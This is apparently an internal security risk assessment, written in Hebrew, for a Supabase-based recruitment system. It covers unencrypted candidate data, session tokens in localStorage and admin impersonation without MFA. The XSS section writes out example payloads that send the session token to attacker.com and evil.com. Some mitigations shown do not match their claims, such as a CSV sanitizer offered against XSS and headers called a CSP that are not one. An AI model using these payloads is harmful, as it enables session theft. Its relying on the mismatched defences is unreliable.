# הערכת סיכונים - שימוש פנימי במערכת Scaler

**תאריך:** 6 בנובמבר 2025
**סטטוס אבטחה:** 7.5/10
**מתאים לשימוש פנימי:** ✅ כן, עם הגבלות

---

## סיכום מהיר

✅ **המערכת מתאימה לשימוש פנימי** אם:
- השימוש הוא בארגון סגור (לא public-facing)
- המשתמשים הם עובדים מהימנים
- הרשת מאובטחת (VPN/firewall)
- אין דרישות GDPR/SOC2 מחמירות

⚠️ **דורש זהירות נוספת** אם:
- מעבדים נתונים רגישים מאוד
- יש דרישות compliance חמורות
- משתמשים חיצוניים ניגשים למערכת
- הארגון הוא target מועדף לתקיפות

---

## פגיעויות שנותרו - ניתוח מפורט

### 🟠 H-1: אין הצפנת נתונים במנוחה (Data at Rest)

#### מה הבעיה?
```
נתוני מועמדים מאוחסנים בטקסט גלוי במסד הנתונים:
├── שמות מלאים (full_name)
├── כתובות LinkedIn (linkedin_url)
├── פרופילים מקצועיים (profile_summary)
├── היסטוריית עבודה (current_company, previous_company)
└── השכלה (education)
```

#### באיזה תרחיש זה מסוכן?

**תרחיש 1: פריצה למסד הנתונים של Supabase**
```
סבירות: נמוכה (Supabase מאובטח היטב)
השפעה: גבוהה (חשיפת כל הנתונים)

איך זה יכול לקרות:
├── פריצה לחשבון Supabase admin
├── פרצת אבטחה ב-Supabase עצמו
├── גישה פיזית לשרתים
└── עובד פנים זדוני ב-Supabase
```

**תרחיש 2: גיבוי לא מאובטח**
```
סבירות: בינונית-גבוהה
השפעה: גבוהה

איך זה יכול לקרות:
├── גיבוי נשמר ב-S3 לא מוצפן
├── גיבוי נשלח במייל
├── גיבוי על USB שאבד
└── גיבוי בענן אישי (Dropbox)
```

**תרחיש 3: SQL Injection מורכב שעקף את Supabase SDK**
```
סבירות: נמוכה מאוד (הקוד מוגן)
השפעה: גבוהה
```

#### מה המערכת מגנה בינתיים?

✅ **Row Level Security (RLS)**
- משתמש A לא יכול לראות נתונים של משתמש B
- גם אם יש SQL injection, RLS מגביל גישה
- פריצה דרך הקוד לא תחשוף הכל

✅ **Supabase הוא מאובטח**
- Encryption in transit (HTTPS)
- Physical security של AWS
- Audited infrastructure
- SOC2 certified

✅ **הגישה מוגבלת**
- רק משתמשים מורשים יכולים להתחבר
- Email verification חובה
- אין public API endpoints

#### האם זה מספיק לשימוש פנימי?

| תרחיש שימוש | מספיק? | הסבר |
|--------------|--------|------|
| 🏢 HR פנימי בחברה קטנה (10-50 עובדים) | ✅ כן | סיכון נמוך, נתונים לא רגישים במיוחד |
| 🏦 גיוס בבנק/חברת אבטחה | ⚠️ לא | נתונים רגישים, דרישות compliance |
| 🎓 מחקר אקדמי | ✅ כן | אם יש IRB approval ואנונימיזציה |
| 💼 משרד גיוס מסחרי | ⚠️ תלוי | אם יש חוזים עם לקוחות - צריך הצפנה |
| 🏥 גיוס רפואי | ❌ לא | HIPAA compliance דורש הצפנה |

#### פתרון זמני (Workaround):
```bash
# 1. אל תשמור נתונים רגישים מאוד
# 2. השתמש במדיניות שמירה קצרה (מחק אחרי 30 יום)
# 3. אנונימיזציה: החלף שמות באינדקסים לפני שמירה
# 4. הצפן גיבויים ידנית לפני שמירה

# דוגמה לאנונימיזציה:
# במקום: "John Doe"
# שמור: "Candidate_12345"
```

---

### 🟠 H-3: Session Tokens ב-localStorage (XSS Risk)

#### מה הבעיה?
```typescript
// הקוד הנוכחי ב-src/integrations/supabase/client.ts:
auth: {
  storage: localStorage,  // ❌ Session נשמר ב-localStorage
  persistSession: true,
}

// localStorage נגיש ל-JavaScript:
const token = localStorage.getItem('supabase.auth.token');
// אם יש XSS - התוקף יכול לקרוא את זה!
```

#### באיזה תרחיש זה מסוכן?

**תרחיש 1: XSS Attack דרך CSV מזויף**
```javascript
// תוקף מעלה CSV עם payload זדוני:
full_name,current_title,current_company
"<img src=x onerror='fetch(\"https://attacker.com/steal?token=\"+localStorage.getItem(\"supabase.auth.token\"))'>",Engineer,Google

// כשמשתמש אחר רואה את הפרופיל:
// 1. ה-HTML מרונדר
// 2. onerror מופעל
// 3. Session token נגנב
```

**סבירות בקוד הנוכחי:** נמוכה מאוד
**למה?**
```typescript
// הוספנו sanitization היום!
const sanitizeForCSV = (value: string): string => {
  if (/^[=+\-@\t\r]/.test(trimmed)) {
    return `'${trimmed}`;  // ✅ מונע injection
  }
  return trimmed;
};
```

**תרחיש 2: XSS דרך תלות שנפרצה (Supply Chain Attack)**
```javascript
// אם אחת החבילות ב-node_modules נפרצה:
// npm install compromised-package
// הקוד הזדוני יכול:
document.addEventListener('DOMContentLoaded', () => {
  const token = localStorage.getItem('supabase.auth.token');
  fetch('https://evil.com/steal', { body: token });
});
```

**סבירות:** נמוכה (אבל קורה!)
**דוגמאות אמיתיות:**
- event-stream (2018) - 8M downloads
- ua-parser-js (2021) - 7M downloads
- node-ipc (2022) - protestware

#### מה המערכת מגנה בינתיים?

✅ **Content-Security-Policy headers** (הוספנו היום)
```typescript
// vite.config.ts
headers: {
  'X-XSS-Protection': '1; mode=block',
  'X-Content-Type-Options': 'nosniff',
}
```

✅ **Input Sanitization** (הוספנו היום)
- CSV injection protected
- SQL injection protected

✅ **React's XSS Protection**
- React escapes HTML by default
- Dangerous content needs explicit `dangerouslySetInnerHTML`

❌ **אבל:**
- אין CSP מלא (קשה להגדיר עם Vite)
- אין Subresource Integrity (SRI)
- תלויות לא סרוקות באופן קבוע

#### האם זה מספיק לשימוש פנימי?

| תרחיש שימוש | מספיק? | הסבר |
|--------------|--------|------|
| 🏢 רשת פנימית מבודדת | ✅ כן | אין גישה לאינטרנט חיצוני |
| 🌐 גישה דרך אינטרנט פנימי | ⚠️ כנראה | בתנאי שהמשתמשים מהימנים |
| 🌍 גישה פומבית | ❌ לא | חובה httpOnly cookies |

#### פתרון זמני (Workaround):
```bash
# 1. הגבל גישה לרשת פנימית בלבד
# הגדר Firewall rules:
iptables -A INPUT -p tcp --dport 8080 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 8080 -j DROP

# 2. הפעל Content Security Policy מחמיר יותר
# (דורש עדכון ב-production server)

# 3. השתמש ב-npm audit באופן קבוע
npm audit
npm audit fix

# 4. סרוק תלויות עם Snyk
npx snyk test
```

---

### 🟡 M-1: Admin Impersonation ללא MFA

#### מה הבעיה?
```typescript
// מנהל יכול להתחזות למשתמש אחר ללא אימות נוסף:
const { setImpersonatedUser } = useAdminImpersonation();
setImpersonatedUser({ email: 'victim@example.com', user_id: '...' });

// עכשיו המנהל רואה הכל של המשתמש הזה
```

#### באיזה תרחיש זה מסוכן?

**תרחיש 1: חשבון מנהל נפרץ**
```
1. תוקף משיג סיסמת מנהל (phishing/keylogger)
2. מתחבר כמנהל
3. מתחזה לכל משתמש במערכת
4. רואה/משנה/מוחק נתונים
5. מוחק את audit logs
```

**תרחיש 2: מנהל זדוני**
```
1. עובד לשעבר עם הרשאות admin
2. התפטר בכעס
3. נכנס למערכת לפני שהסירו את ההרשאות
4. מייצא את כל הנתונים
5. מוחק הכל
```

#### מה המערכת מגנה בינתיים?

✅ **Audit Logging**
```sql
-- כל impersonation נרשם ב-admin_audit_log
INSERT INTO admin_audit_log (
  admin_user_id,
  action,
  target_user_id,
  details,
  timestamp
) VALUES (...);
```

✅ **Email Verification**
- מנהלים חייבים לאמת email
- לא אפשר ליצור חשבון admin ללא approval

✅ **Session Timeout**
- Sessions expire after inactivity
- צריך להתחבר מחדש

❌ **אבל:**
- אין MFA (אימות דו-שלבי)
- אין re-authentication לפני impersonation
- Audit logs ניתנים למחיקה (בידי super-admin)

#### האם זה מספיק לשימוש פנימי?

| תרחיש שימוש | מספיק? | הסבר |
|--------------|--------|------|
| 🏢 חברה קטנה (1-2 מנהלים) | ✅ כן | אמון בעלי תפקידים |
| 🏢 חברה בינונית (3-10 מנהלים) | ⚠️ תלוי | תלוי באמון ובמדיניות |
| 🏢 חברה גדולה (10+ מנהלים) | ❌ לא | חובה MFA + least privilege |
| 🏦 ארגון פיננסי/בריאות | ❌ לא | Compliance דורש MFA |

#### פתרון זמני (Workaround):
```typescript
// 1. הגבל מספר מנהלים למינימום (1-2)
// 2. שנה סיסמאות מנהלים באופן קבוע (כל 30 יום)
// 3. השתמש במנהל סיסמאות חזק (1Password, Bitwarden)
// 4. הוסף התראות על impersonation:

// src/hooks/useAdminImpersonation.tsx
const setImpersonatedUserWithAlert = async (targetUser) => {
  // שלח מייל התראה למנהל ראשי
  await fetch('/api/alert', {
    body: JSON.stringify({
      action: 'IMPERSONATION_STARTED',
      admin: user.email,
      target: targetUser.email,
      timestamp: new Date()
    })
  });

  setImpersonatedUser(targetUser);
};

// 5. סקור את audit logs באופן קבוע (שבועי)
```

---

## מטריקס החלטה - האם להשתמש במערכת?

### תרחישים שבהם זה **בטוח מספיק** ✅

```
┌─────────────────────────────────────────────────────────┐
│ ✅ כן, המשך להשתמש במערכת בתנאים הבאים:                │
├─────────────────────────────────────────────────────────┤
│                                                          │
│ 1️⃣  רשת פנימית מבודדת                                   │
│    └─ גישה רק דרך VPN או רשת משרדית                    │
│    └─ לא נגיש מהאינטרנט הפתוח                          │
│                                                          │
│ 2️⃣  משתמשים מהימנים                                     │
│    └─ עובדים קבועים בלבד                               │
│    └─ NDA חתום                                          │
│    └─ Background check בוצע                            │
│                                                          │
│ 3️⃣  נתונים לא רגישים במיוחד                            │
│    └─ לא HIPAA (בריאות)                                │
│    └─ לא PCI-DSS (כרטיסי אשראי)                        │
│    └─ לא מסמכים סודיים ממשלתיים                        │
│                                                          │
│ 4️⃣  מדיניות אבטחה נוספת                                │
│    └─ גיבויים מוצפנים                                  │
│    └─ מחיקת נתונים אחרי 30-90 יום                      │
│    └─ סקירת audit logs שבועית                         │
│    └─ עדכוני אבטחה חודשיים (npm audit)                │
│                                                          │
│ 5️⃣  מנהלים מוגבלים                                     │
│    └─ לכל היותר 2-3 מנהלים                             │
│    └─ הרשאות admin רק למי שצריך                        │
│    └─ שינוי סיסמה חובה כל 30 יום                       │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### דוגמאות לשימוש בטוח:

**✅ סטארט-אפ טכנולוגיה (20 עובדים)**
```
תרחיש: HR מנהלת גיוס למפתחים
סביבה: משרד סגור, רשת פנימית
נתונים: קורות חיים של מועמדים טכנולוגיים
סיכון: נמוך
החלטה: ✅ מתאים
```

**✅ מחלקת IT בחברת SaaS**
```
תרחיש: גיוס פנימי למהנדסי תוכנה
סביבה: VPN + רשת ענן מאובטחת
נתונים: פרופילים טכניים מ-LinkedIn
סיכון: נמוך-בינוני
החלטה: ✅ מתאים
```

**✅ מחקר אקדמי**
```
תרחיש: ניתוח קורות חיים לצורכי מחקר
סביבה: רשת אוניברסיטה
נתונים: מאוננמים (ללא שמות אמיתיים)
סיכון: נמוך
החלטה: ✅ מתאים
```

---

### תרחישים שבהם **חובה לתקן לפני שימוש** ❌

```
┌─────────────────────────────────────────────────────────┐
│ ❌ לא, אל תשתמש לפני תיקון בתרחישים הבאים:            │
├─────────────────────────────────────────────────────────┤
│                                                          │
│ 1️⃣  גישה פומבית לאינטרנט                               │
│    └─ המערכת נגישה מכל מקום בעולם                      │
│    └─ משתמשים חיצוניים (לא עובדים)                    │
│    └─ Signup פתוח לכולם                                │
│    ⚠️  חובה לתקן: H-3 (httpOnly cookies)              │
│                                                          │
│ 2️⃣  נתונים רגישים מאוד                                  │
│    └─ מידע רפואי (HIPAA)                               │
│    └─ נתונים פיננסיים (PCI-DSS)                        │
│    └─ מידע ממשלתי מסווג                                │
│    ⚠️  חובה לתקן: H-1 (encryption at rest)            │
│                                                          │
│ 3️⃣  דרישות Compliance                                   │
│    └─ GDPR (אירופה)                                    │
│    └─ SOC2                                              │
│    └─ ISO 27001                                         │
│    ⚠️  חובה לתקן: H-1, H-3, M-1                        │
│                                                          │
│ 4️⃣  ארגון בסיכון גבוה                                   │
│    └─ Target מועדף לתקיפות (בנק, ביטחון)              │
│    └─ היסטוריה של תקיפות                               │
│    └─ מתחרים עוינים                                    │
│    ⚠️  חובה לתקן: הכל                                  │
│                                                          │
│ 5️⃣  משתמשים רבים/לא מהימנים                            │
│    └─ 100+ משתמשים                                      │
│    └─ Contractors חיצוניים                             │
│    └─ Turnover גבוה                                    │
│    ⚠️  חובה לתקן: M-1 (MFA) + audit trails            │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### דוגמאות לשימוש מסוכן:

**❌ משרד גיוס מסחרי עם לקוחות**
```
תרחיש: גיוס עבור חברות לקוחות
סביבה: גישה דרך אינטרנט
נתונים: מועמדים של לקוחות חיצוניים
סיכון: גבוה (אחריות משפטית)
החלטה: ❌ תקן H-1 (הצפנה) לפני שימוש
```

**❌ גיוס רפואי**
```
תרחיש: גיוס רופאים/אחיות
סביבה: בתי חולים
נתונים: עלול לכלול מידע רפואי
סיכון: קריטי (HIPAA violations)
החלטה: ❌ תקן H-1, H-3, M-1 + audits
```

**❌ חברת אבטחת סייבר**
```
תרחיש: גיוס מומחי אבטחה
סביבה: target מועדף למתקפות
נתונים: פרופילים של מומחי אבטחה
סיכון: גבוה מאוד (reputational damage)
החלטה: ❌ תקן הכל + penetration testing
```

---

## המלצות לפי סוג ארגון

### 🏢 סטארט-אפ קטן (1-50 עובדים)

**סטטוס:** ✅ מתאים לשימוש

**המלצות:**
```bash
1. ✅ השתמש במערכת כמו שהיא
2. 🔒 הגבל גישה לרשת משרדית בלבד
3. 📧 הוסף התראות email על פעולות admin
4. 📅 סקור audit logs פעם בשבוע
5. 🔄 עדכן dependencies חודשי (npm audit)
6. 🗑️ מחק נתונים ישנים אחרי 30 יום
7. 💾 גבויים מוצפנים (zip + password)
```

**עלות זמן:** 1 שעה/שבוע

---

### 🏢 חברה בינונית (50-200 עובדים)

**סטטוס:** ⚠️ מתאים בתנאים

**המלצות:**
```bash
1. ⚠️  השתמש רק בVPN או רשת פנימית
2. 🔐 הוסף MFA לכל המנהלים (M-1) - עדיפות גבוהה
3. 📊 סקירת audit logs אוטומטית (weekly report)
4. 👥 הגבל מספר admins ל-2-3 לכל היותר
5. 🔑 שנה סיסמאות admin כל 30 יום
6. 🔍 הוסף Snyk/Dependabot לסריקת תלויות
7. 📝 כתוב מדיניות אבטחת מידע
```

**עלות זמן:** 4 שעות בהקמה + 2 שעות/שבוע

**תיקונים מומלצים בתוך חודש:**
- M-1: הוסף MFA למנהלים
- תכנן H-3: httpOnly cookies

---

### 🏢 חברה גדולה (200+ עובדים)

**סטטוס:** ❌ לא מתאים בלי תיקונים

**חובה לתקן:**
```bash
Priority 1 (תוך שבועיים):
├── M-1: MFA למנהלים
├── Comprehensive audit logging
└── Rate limiting נוסף

Priority 2 (תוך חודש):
├── H-3: httpOnly cookies
├── Data retention policies
└── Incident response plan

Priority 3 (תוך 3 חודשים):
├── H-1: Encryption at rest
├── SOC2 compliance prep
└── Penetration testing
```

**עלות זמן:** 2-3 שבועות פיתוח

---

### 🏦 ארגון מוסדר/פיננסי

**סטטוס:** ❌ לא מתאים כלל

**חובה לתקן הכל:**
```bash
1. ❌ H-1: הצפנת נתונים במנוחה (Supabase Vault)
2. ❌ H-3: httpOnly cookies + proxy server
3. ❌ M-1: MFA חובה לכולם (לא רק admins)
4. ❌ תיעוד compliance מלא (GDPR/SOC2)
5. ❌ Penetration testing מקצועי
6. ❌ DLP (Data Loss Prevention)
7. ❌ Incident Response Plan
8. ❌ ביטוח cyber
```

**עלות זמן:** 2-3 חודשים + ייעוץ חיצוני

---

## טבלת החלטה מהירה

| שאלה | כן ✅ | לא ❌ |
|------|-------|-------|
| הגישה רק מרשת פנימית/VPN? | ✅ המשך | ❌ תקן H-3 |
| משתמשים הם עובדים מהימנים בלבד? | ✅ המשך | ❌ תקן M-1 |
| הנתונים לא כוללים מידע רגיש במיוחד? | ✅ המשך | ❌ תקן H-1 |
| פחות מ-3 מנהלים? | ✅ המשך | ❌ תקן M-1 |
| אין דרישות GDPR/SOC2/HIPAA? | ✅ המשך | ❌ תקן הכל |
| מוכנים לסקור audit logs שבועית? | ✅ המשך | ❌ אוטומט audit |
| יש תהליך גיבויים מוצפנים? | ✅ המשך | ❌ הגדר גיבויים |

**אם ענית "כן" על הכל → ✅ המערכת מתאימה לשימוש פנימי**

**אם יש 1-2 "לא" → ⚠️ תקן את הבעיות ספציפית**

**אם יש 3+ "לא" → ❌ אל תשתמש לפני תיקונים**

---

## מדיניות שימוש מומלצת

### ✅ DO - מה כן לעשות:

```bash
✅ השתמש ברשת פנימית בלבד
✅ הגבל הרשאות admin למינימום
✅ סקור audit logs באופן קבוע
✅ מחק נתונים ישנים (30-90 יום)
✅ הצפן גיבויים
✅ עדכן dependencies (npm audit) חודשי
✅ השתמש במנהל סיסמאות חזק
✅ הוסף VPN לגישה מרחוק
✅ אמן משתמשים על אבטחת מידע
✅ תעד שינויים ופעולות חשובות
```

### ❌ DON'T - מה לא לעשות:

```bash
❌ אל תחשוף למערכת לאינטרנט פתוח
❌ אל תתן הרשאות admin למי שלא צריך
❌ אל תשמור נתונים רגישים מדי (SSN, מידע רפואי)
❌ אל תזניח audit logs
❌ אל תשמור גיבויים לא מוצפנים
❌ אל תשתף סיסמאות
❌ אל תדלג על עדכוני אבטחה
❌ אל תתן גישה לקבלנים חיצוניים ללא NDA
❌ אל תשכח לבדוק אחרי שינויי קוד
❌ אל תבטח שזה בסדר בלי לסקור
```

---

## סיכום והחלטה סופית

### ✅ תשובה: **כן, אפשר להשתמש - עם תנאים**

המערכת **בטוחה מספיק** לשימוש פנימי בארגון קטן-בינוני בתנאים הבאים:

1. **גישה מוגבלת** - רשת פנימית או VPN בלבד
2. **משתמשים מהימנים** - עובדים קבועים עם NDA
3. **נתונים לא קריטיים** - לא HIPAA/PCI-DSS/סודי
4. **אבטחה נוספת** - audit logs, גיבויים, עדכונים
5. **מנהלים מוגבלים** - 2-3 לכל היותר

### ציון אבטחה לפי סוג שימוש:

```
שימוש פנימי בארגון קטן:        8/10 ✅
שימוש פנימי בארגון בינוני:      7/10 ⚠️
שימוש פנימי בארגון גדול:        6/10 ⚠️
שימוש עם גישה חיצונית:          4/10 ❌
שימוש למידע רגיש מאוד:          3/10 ❌
שימוש בארגון מוסדר:             2/10 ❌
```

### תזכורת חשובה:

> 🔐 **"בטוח מספיק" ≠ "בטוח מושלם"**
>
> המערכת עמידה מפני רוב התקיפות הנפוצות,
> אבל יש פגיעויות שיכולות להיות מנוצלות
> בתרחישים ספציפיים.
>
> השתמש בשיקול דעת והוסף שכבות אבטחה נוספות.

---

**מסמך זה עודכן:** 6 בנובמבר 2025
**גרסת מערכת:** 7.5/10
**לשאלות נוספות:** היוועץ במומחה אבטחת מידע
